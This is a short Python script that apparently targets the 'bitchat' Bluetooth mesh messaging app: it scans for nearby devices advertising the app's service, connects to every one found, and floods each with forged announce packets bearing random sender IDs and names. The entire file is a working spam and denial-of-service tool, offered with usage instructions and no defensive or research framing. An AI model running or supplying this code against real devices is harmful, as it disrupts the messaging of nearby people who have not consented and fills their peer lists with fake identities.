#!/usr/bin/env python3
import asyncio
import struct
import time
import uuid
import random
import sys
from bleak import BleakScanner, BleakClient

BITCHAT_SERVICE_UUID = ["F47B5E2D-4A9E-4C5A-9B3F-8E1D2C3A4B5C"]
BITCHAT_CHAR_UUID = "A1B2C3D4-E5F6-4A5B-8C9D-0E1F2A3B4C5D"
HEX_CHARS = '0123456789abcdef'

def generate_announce_packet(sender_id, sender_name, ttl=3):
    packet = bytes.fromhex("0101")
    packet += struct.pack('>B', ttl)
    packet += struct.pack('>Q', int(time.time() * 1000))
    packet += bytes.fromhex("00")
    packet += struct.pack('>H', len(sender_name))
    packet += sender_id
    packet += sender_name
    return packet

async def blast_announces(address, char_uuid, num_packets):
    try:
        async with BleakClient(address, timeout=3.0) as client:
            if not client.is_connected:
                return

            for _ in range(num_packets):
                # Fully random sender ID and name for each packet
                sender_id = bytes.fromhex(''.join(random.choices(HEX_CHARS, k=16)))
                sender_name = bytes.fromhex(''.join(random.choices(HEX_CHARS, k=32)))
                packet = generate_announce_packet(sender_id, sender_name)
                
                await client.write_gatt_char(char_uuid, packet, response=False)
                # Very short delay to avoid OS/hardware overrun (tune this as needed)
                await asyncio.sleep(0.05)
            print(f"[+] Sent {num_packets} announces to {address}")

    except Exception as e:
        print(f"[!] Error with {address}: {e}")

async def bcspam(num_packets):
    print("[*] Scanning for bitchat devices...")
    devices = await BleakScanner.discover(return_adv=True, service_uuids=BITCHAT_SERVICE_UUID)

    tasks = []
    for d, adv in devices.values():
        print(f"[✓] Found device: {d.address}")
        tasks.append(blast_announces(d.address, BITCHAT_CHAR_UUID, num_packets))

    if tasks:
        await asyncio.gather(*tasks)
    else:
        print("[-] No bitchat-compatible devices found.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <num_announces_per_device>")
        sys.exit(1)

    try:
        num_packets = int(sys.argv[1])
        if num_packets <= 0:
            raise ValueError("Must be > 0")
    except Exception as e:
        print(f"[-] Invalid number of packets: {e}")
        sys.exit(1)

    asyncio.run(bcspam(num_packets))

